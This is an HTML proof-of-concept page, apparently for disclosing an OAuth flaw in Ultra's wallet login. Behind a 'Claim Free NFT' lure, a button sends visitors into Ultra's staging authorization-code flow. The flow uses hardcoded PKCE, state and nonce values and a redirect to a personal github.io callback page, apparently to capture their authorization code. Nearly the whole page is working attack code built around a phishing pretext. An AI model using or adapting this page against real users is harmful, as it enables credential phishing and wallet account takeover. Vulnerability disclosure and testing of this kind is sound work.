<!DOCTYPE html>
<html>
<head>
  <title>Ultra Wallet PoC</title>
</head>
<body>
  <h1>üéÅ Claim Free NFT</h1>
  <button id="connect">Connect Ultra Wallet</button>

  <script>
    async function sha256(base64String) {
      const encoder = new TextEncoder();
      const data = encoder.encode(base64String);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return btoa(String.fromCharCode(...hashArray))
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    }

    document.getElementById('connect').onclick = async () => {
      const codeVerifier = '47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU';
      const codeChallenge = await sha256(codeVerifier);
      const state = 'secureState456';
      const nonce = 'random123';
      const clientId = '2f6ca3c9-87ec-4042-a464-21349485a16f';
      const redirectUri = 'https://nathanogaga118.github.io/ultra-poc/callback.html';

      const authURL = `https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/auth?response_type=code&client_id=${clientId}&state=${state}&redirect_uri=${encodeURIComponent(redirectUri)}&scope=openid&code_challenge=${codeChallenge}&code_challenge_method=S256&nonce=${nonce}`;

      sessionStorage.setItem('code_verifier', codeVerifier);
      window.location = authURL;
    };
  </script>
</body>
</html>
